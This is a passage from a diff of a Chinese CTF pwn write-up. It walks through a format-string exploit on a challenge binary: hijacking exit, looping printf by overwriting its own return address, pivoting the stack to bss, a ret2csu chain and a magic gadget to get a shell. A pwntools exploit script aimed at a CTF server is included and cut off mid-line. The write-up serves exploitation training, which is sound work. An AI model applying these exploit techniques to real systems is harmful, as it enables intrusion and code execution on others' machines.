 <h4 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)<span class="comment">#这个地址要放在最后，如果放在payload最开始</span></span><br><span class="line"><span class="comment">#p64打包产生的00会将格式化字符函数截断，导致后面布置的格式化字符无法被解析</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>关于payload解释如下</p>
-<p><img src="/../img/2706180-20220419222849072-1784896764.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018018.png"></p>
 <p>此处距离栈顶偏移20，再加上6个寄存器，偏移为26。</p>
 <p>payload从0x601060开始输入，把格式化字符部分填充为16个字节，因此0x601070装的是0x4007A3。<strong>在__dl__fini中执行add的时候r12原本的值为0x600dd8</strong>。因此需要将rbx所指向的值修改为0x298(0x601070-0x600dd8) ，这样才能让最后call的时候r12为0x601070。</p>
 <h3 id="如何多次任意写？"><a href="#如何多次任意写？" class="headerlink" title="如何多次任意写？"></a>如何多次任意写？</h3><p>现在确实是又返回到了read函数，我们的思路应该是写个rop链在bss段，然后想办法让执行流迁移过去。具体细节先不想那么多，但是一次printf肯定是不行的，那怎么办？光想的话，我也不知道怎么办…    那就继续调试，看看此时栈里有没有可用利用的地方</p>
-<p><img src="/../img/2706180-20220419222914265-1836923816.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018019.png"></p>
 <p>可以发现栈里此时多了很多指向栈本身的指针，最值得关注的是红框的那个地方。这个栈地址是指向当前栈顶的上一个内存单元，这意味着如果执行printf的话，那printf的返回地址将被存放到这个内存单元（如下图）</p>
-<p><img src="/../img/2706180-20220419222930128-970393783.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018020.png"></p>
 <p>此时的这个0x4007c6就是printf的返回地址了。</p>
 <p>所以我们就可以… <strong>用printf修改printf的返回地址以便让执行流继续执printf</strong>！！</p>
 <p>（这个想法听起来有点小疯狂，但是确实可以实现，<strong>这样做的前提是栈中必须存放着一个栈地址，并且这个栈地址指向了当前函数的返回地址</strong>）</p>
@@ -331,7 +333,7 @@
 <p>2、在不知道libc基址的情况下，目前我能想到的方法只有去利用magic_gadget来修改一个got表了。</p>
 <p>3、想利用magic_gadget就肯定是需要专门控制寄存器，采用的手法肯定要是ret2csu。但是想利用ret2csu中的pop去控制各个寄存器，就意味着我们能够控制栈中的数据，可事实上我们输入的内容全都跑到bss段了。（如果利用格式化字符函数把数据全部布置到栈上是不现实的）因此采用的对抗策略是迁移栈到bss段。</p>
 <p>4、这道题迁移栈和以往的栈迁移不一样，以往的栈迁移是可控的栈地址很少，因此装个leave；ret，但事实上这道题我们压根就无法输入内容到栈上。考虑下栈迁移的本质是什么？ 控制rsp寄存器。搜一下gadget看看？</p>
-<p><img src="/../img/2706180-20220419221012046-905721054.png" alt="image-20220419121807276"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018021.png" alt="image-20220419121807276"></p>
 <p>发现是存在pop rsp的。</p>
 <p>5、至此思路已经很清晰了，用pop rsp来改变栈到bss段，然后布置rop链到bss段。不过在此之前我们需要将pop rsp布置到bss地址的上面紧挨着的内存单元(因为pop弹的就是下一个内存单元的值给rsp)。</p>
 <p>而pop rsp最终怎么被执行？只能是将print的返回地址改成pop rsp的地址</p>
@@ -342,7 +344,7 @@
 <h2 id="栈链的布置"><a href="#栈链的布置" class="headerlink" title="栈链的布置"></a>栈链的布置</h2><p>首先明确两件事情，我们修改地址无法用$n一次性将整个内容全部写入(因为字符数量太多将导致传输异常）因此我们最多只能一次写两字节($hn)或是一次写一字节($hhn)。</p>
 <p>第二件事，就是使用格式化字符串任意写的时候，是利用相对栈顶偏移写入数据，难道是将数据写到相对栈顶偏移的这个地方？不不不，<strong>其实是将数据写到了相对于栈顶偏移这个地方所指向的地方。</strong></p>
 <p>以<code>%100c%9$hn</code>为例。它的意思是<strong>说将100写入距离栈顶偏移为9所指向的位置</strong>（如下图）。</p>
-<p><img src="/../img/2706180-20220419222956380-1871716338.png"><br><img src="/../img/2706180-20220419223019980-1819334104.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018022.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018023.png"></p>
 <p>这两张图片应该能说明的很充分了吧，<strong>就是栈中数据必须是个地址，才能通过它修改它指向的那个位置</strong>。（0x112233变成0x112264是因为100的十六进制是64）</p>
 <blockquote>
 <p>此时我们想在一个大小为八字节的内存单元中用一次写入两字节的方法凭空写一个bss段地址，需要怎么做？</p>
@@ -351,7 +353,7 @@
 <p>我们似乎要去找一个栈地址a，这个栈地址a指向的内容也要是个栈地址b，然后我们就可以去往栈地址b所指向的那个内存单元里写入一个bss段地址了，就跟上面那两张图片一样？</p>
 <p>但是似乎出现了点问题，因为我们只能一次写入两字节，而要写入bss段地址的同时还要将这个内存单元中没有用的部分将其设置为0。如果再按照上面两个图片的方法去写入，我们永远只能去修改那一个字节的部分。</p>
 <p>因此产生的策略是，我们用三个指针来完成写入bss地址这件事。直接上图片</p>
-<p><img src="/../img/2706180-20220419223038254-1190819708.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018024.png"></p>
 <p>现在假设a,b,c全部都为栈地址，而d的值为0xffffffffffffffff，我们最终的目的是将d修改为0x601060。</p>
 <blockquote>
 <p> 我们先看最后一行的三个指针，如果现在有个格式化字符串漏洞的话，我们是可以拿到b距离栈顶偏移，然后通过b去修改c的值。然后还可以看第二行，拿到c相对栈顶偏移，通过c去修改d的值。而我们每次只能写入两个字节，也就是说第一次只能通过c来将d修改为0xffffffffffff1060。然后我们再去第三行，通过b来修改c的值，把c改成c+2，接着再回到第二行，通过c来修改d的值，这次我们将d可以改成0xffffffff00601060。依次类推（把前面的ff全部改成0），我们靠移动c指针的位置，来改变我们写入d的位置，尽管一次是写入两个字节，但是最终依旧可以达到在一个内存单元中写出一个完整的地址。</p>
@@ -359,68 +361,68 @@
 <p>如果没理解的话，先确保自己是否真的明白如何利用格式化字符漏洞完成写的操作，如果是真的明白这件事，就反复去想一下上面的过程。</p>
 <p>ok,我现在假设你已经懂了上面的过程，那接下来的过程对你来说就是小儿科了。</p>
 <p>思路重新回到这个题目来，看一下执行完第一个payload之后，栈里的情况（如下图）</p>
-<p><img src="/../img/2706180-20220419221011687-970875891.png" alt="image-20220419144015357"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018025.png" alt="image-20220419144015357"></p>
 <p>现在我们要做的就是在栈里写一个bss段地址（本题写的bss段地址是0x601088，这个地址刚开始是不知道的，我们可以先随便写个地址，最后通过调试去把这个正确的地址进行重新修正）</p>
 <p>上图中标注的①，②，③其实就对应我演示的那个图片。还记得上文提到的一个半成品payload么，其实就是④，printf将修改它自己的返回地址。</p>
 <p>下面来展示下payload，以及修改前后的栈（变化前后的地方已用红框标注）（修改原理上面已经介绍过了）</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#泄露的栈地址距离返回地址下面的那个内存单元的地址偏移为0x118</span></span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"><span class="comment">#if进行判断是因为，我们并不知道hook_addr和0xa3谁打，因此需要应对这两种情况</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419221009667-1000319065.png" alt="image-20220419175618585"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018026.png" alt="image-20220419175618585"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419221008260-139544778.png" alt="image-20220419191555739"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018027.png" alt="image-20220419191555739"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span><span class="comment">#去写入低二字节0x1088</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419221006281-955412098.png" alt="image-20220419175849476"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018028.png" alt="image-20220419175849476"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419221004925-759941982.png" alt="image-20220419191955052"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018030.png" alt="image-20220419191955052"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419221003228-2090621249.png" alt="image-20220419180744259"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018031.png" alt="image-20220419180744259"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419221001000-1387788773.png" alt="image-20220419180954716"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018032.png" alt="image-20220419180954716"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419220959694-85625257.png" alt="image-20220419182535080"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018033.png" alt="image-20220419182535080"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419220958563-1794782074.png" alt="image-20220419183311175"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018034.png" alt="image-20220419183311175"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#继续将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419220957599-2028534812.png" alt="image-20220419184908968"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018035.png" alt="image-20220419184908968"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419220956611-987086324.png" alt="image-20220419185253367"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018036.png" alt="image-20220419185253367"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span>  <span class="comment">#这个的意思是写入两字节的0给栈顶偏移13指向的位置</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span> <span class="comment">#这个等下再说</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>修改前：</p>
-<p><img src="/../img/2706180-20220419220955982-2010102532.png" alt="image-20220419204052994"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018037.png" alt="image-20220419204052994"></p>
 <p>修改后：</p>
-<p><img src="/../img/2706180-20220419220955263-29560299.png" alt="image-20220419204804195"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018038.png" alt="image-20220419204804195"></p>
 <p>至此我们已经达到想要的效果了，也就是将printf返回地址下面的那个内存单元写成bss段地址。</p>
 <p>接下来我们就不用printf再返回去执行read了，我们去执行pop rsp</p>
-<p><img src="/../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png" alt="image-20220419205614827"></p>
 <p>只需去改变返回地址的最后两字节即可。(payload如下)</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>至此，前面的工作全部完成，已经可以去迁移到我们指定的bss段了。接下来就是rop链的构造，不过在此之前还是需要介绍一下magic gadget</p>
 <h3 id="介绍一下magic-gadget"><a href="#介绍一下magic-gadget" class="headerlink" title="介绍一下magic_gadget"></a>介绍一下magic_gadget</h3><h4 id="一个新的magic-gadget"><a href="#一个新的magic-gadget" class="headerlink" title="一个新的magic_gadget"></a>一个新的magic_gadget</h4><p>关于magic_gadget详细解释，我写在了这篇博客上  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p>
-<p><img src="/../img/2706180-20220419220954443-867091423.png" alt="image-20220419132940571"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018040.png" alt="image-20220419132940571"></p>
 <p>我以前用的magic gadget是这个 add    DWORD PTR [rbp-0x3d], ebx  但这道题搜对应的机器码搜不到了…  不过官方放出了另一个gadget </p>
 <p>adc    DWORD PTR [rbp+0x48],edx</p>
 <p>这个的效果是和之前那个magic gadget效果一样。我们只需要利用csu片段控制一下寄存器rbp和edx的值，就可以达到修改的目的。<strong>具体方法为 rbp中装入stderr指针（因为它本身就存在于libc库中），edx中放入libc中stderr与one_gadget的偏移。</strong></p>
 <p>为什么要放stderr？因为标准输入和标准输出我们肯定是不能改，然后我本来是想放个没用函数的got地址，然后给修改了。但是我用pwndbg输入got之后没有把got表给展示出来…</p>
-<p><img src="/../img/2706180-20220419220954240-1943973195.png" alt="image-20220419140734080"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018041.png" alt="image-20220419140734080"></p>
 <p>那就用这个stderr来当做个跳板吧</p>
 <h4 id="如何寻找这个新的magic-gadget"><a href="#如何寻找这个新的magic-gadget" class="headerlink" title="如何寻找这个新的magic gadget"></a>如何寻找这个新的magic gadget</h4><p>ROPgadget –binary a –opcode 11554889       （直接搜这个gadget的机器码）</p>
-<p><img src="/../img/2706180-20220419220954014-45506295.png" alt="image-20220416151801735"></p>
-<p><img src="/../img/2706180-20220419220953665-1979006857.png" alt="image-20220416151836813"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018042.png" alt="image-20220416151801735"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018043.png" alt="image-20220416151836813"></p>
 <h2 id="rop链的构造"><a href="#rop链的构造" class="headerlink" title="rop链的构造"></a>rop链的构造</h2><p>构造rop链之前，我们要考虑一下我们需要怎么做。</p>
 <p>因为无法泄露libc基址，只能利用magic gadget去将stderr修改为one_gadget地址。控制参数使用csu片段，最后利用里面的call ptr去执行stderr，然后获取shell。</p>
 <p>说写就写，首先我们当时是执行了一个pop rsp，但是后面还pop了三个寄存器</p>
-<p><img src="/../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png" alt="image-20220419205614827"></p>
 <p>因此迁移过来的时候，先填充三个垃圾数据。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
@@ -430,14 +432,14 @@
 <p>然后开始控制rdx，结合magic gadget来看的话</p>
 <p>adc    DWORD PTR [rbp+0x48],edx</p>
 <p>rdx里面装的是one_gadget和stderr的偏移（edx就是rdx寄存器的低四字节），由于这个偏移为负的，因此需要加上一个0x10000000000000000 (取补码)</p>
-<p><img src="/../img/2706180-20220419220952622-1140853152.png" alt="image-20220419212514038"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018044.png" alt="image-20220419212514038"></p>
 <p>接下来就是csu的正常传参，等执行完上面这个片段的时候，会再次执行下面的loc_400826，到pop rbp这里将其修改为stderr的地址-0x48即可（因为magic gadget中给stderr加了0x48），然后ret劫持到magic gadget上，最后再执行一次csu片段，控制r12为stderr地址，回到call ptr的时候，即可去执行one_gadget。</p>
 <p>完整rop链：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--&gt;  &#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#减八因为bss段指针的指针需要抬高一个内存单元，去挨着printf返回地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stderr_got_addr=<span class="number">0x601040</span></span><br><span class="line">read_print_addr=<span class="number">0x4007A3</span></span><br><span class="line">pop_rsp_r13_r14_r15_ret=<span class="number">0x40082d</span></span><br><span class="line">adc_addr=<span class="number">0x4006e8</span></span><br><span class="line">csu_gadget1=<span class="number">0x40082A</span></span><br><span class="line">csu_gadget2=<span class="number">0x400810</span></span><br><span class="line">stderr_offset=<span class="number">0x3C5540</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">offset=one_gadget_offset-stderr_offset</span><br><span class="line">term_hook=<span class="number">0x600e10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持exit，控制执行流</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改printf返回地址，修改指针指向的内容（也就是bss段地址）</span></span><br><span class="line"><span class="comment">#此时第一次是不用修改指向bss段指针的，不过之后的每次修改bss段地址，都需要提前移动一下指向bss段的指针</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line"><span class="comment">#if是用来判断，0xa3和输入的指针末尾谁大，以来决定谁放在前面</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span 